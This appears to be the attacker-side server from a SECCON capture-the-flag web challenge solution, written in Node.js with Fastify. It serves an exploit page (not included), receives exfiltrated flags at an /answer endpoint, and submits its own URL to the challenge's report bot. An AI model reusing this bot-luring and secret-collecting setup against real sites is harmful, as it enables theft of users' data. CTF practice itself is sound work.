const fastify = require("fastify")();
const path = require("path");
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_URL = process.env.SECCON_URL;
const ATTACK_URL = process.env.ATTACK_URL;

const autoReport = SECCON_URL != null || ATTACK_URL != null;
if (autoReport) {
  if (SECCON_URL == null) fail("SECCON_URL not found");
  if (ATTACK_URL == null) fail("ATTACK_URL not found");

  if (!ATTACK_URL.startsWith("http://")) {
    fail("The protocol of ATTACK_URL must be http, not https");
  }
}

fastify.register(require("fastify-static"), {
  root: path.join(__dirname, "public"),
  prefix: "/",
});

fastify.get("/answer", async (request, reply) => {
  const flag = request.query.flag;
  console.log(flag); // Got flag!
  reply.send(flag);
});

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const report = async () => {
  const maxIter = 5;

  let iter = 0;
  while (iter++ < maxIter) {
    await sleep(5000);

    try {
      const pingRes = await fetch(ATTACK_URL);
      if (pingRes.status !== 200) {
        throw new Error(`status code for ${ATTACK_URL}: ${pingRes.status}`);
      }

      const url = `${SECCON_URL}/report`;
      const body = new URLSearchParams();
      body.append("url", ATTACK_URL);
      const reportRes = await fetch(url, {
        method: "POST",
        body,
      });
      if (reportRes.status !== 200) {
        throw new Error(`status code for ${url}: ${reportRes.status}`);
      }

      const text = await reportRes.text();
      console.log(text);
      break;
    } catch (e) {
      console.log(e);
    }
  }

  if (iter === maxIter) {
    fail("Failed to exploit");
  }
};

const start = async () => {
  try {
    const port = 8080;
    await fastify.listen(port, "0.0.0.0").then(async () => {
      console.log(`Listening at ${port}`);
      if (autoReport) {
        await report();
        await sleep(120 * 1000);
        process.exit(0);
      }
    });
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};
start();
